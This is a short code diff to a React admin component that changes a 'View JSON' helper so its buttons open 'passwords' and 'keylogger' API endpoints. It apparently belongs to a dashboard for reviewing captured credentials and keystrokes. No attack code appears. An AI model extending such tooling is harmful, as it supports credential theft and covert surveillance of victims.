@@ -541,8 +541,8 @@ class PersistentDrawer extends Component {
     this.saveAccounts()
   }
 
-	viewJSON = () => {
-		window.open("/api/json/" + encodeURIComponent(this.state.currentProject.name) + "?token=" + encodeURIComponent(this.props.token) /*+ "&download=true"*/)
+	viewJSON = type => {
+		window.open(`/api/${type}/` + encodeURIComponent(this.state.currentProject.name) + `?token=` + encodeURIComponent(this.props.token) /*+ "&download=true"*/)
   }
 
   spoofOpen = () => {
@@ -735,7 +735,7 @@ class PersistentDrawer extends Component {
                   <br />
                   <Javascript parentState={this.state} notify={this.props.notify} classes={classes} />
                   <Tooltip title="Show the raw JSON database entries" placement="bottom">
-                    <Button onClick={this.viewJSON} color="primary">
+                    <Button onClick={() => this.viewJSON('passwords')} color="primary">
                       View JSON
                     </Button>
                   </Tooltip>
@@ -943,7 +943,7 @@ class PersistentDrawer extends Component {
                     </Table>
                   </Paper>
                   <Tooltip title="Show the raw JSON database entries" placement="bottom">
-                    <Button onClick={this.viewJSON} color="primary">
+                    <Button onClick={() => this.viewJSON('keylogger')} color="primary">
                       View JSON
                     </Button>
                   </Tooltip>
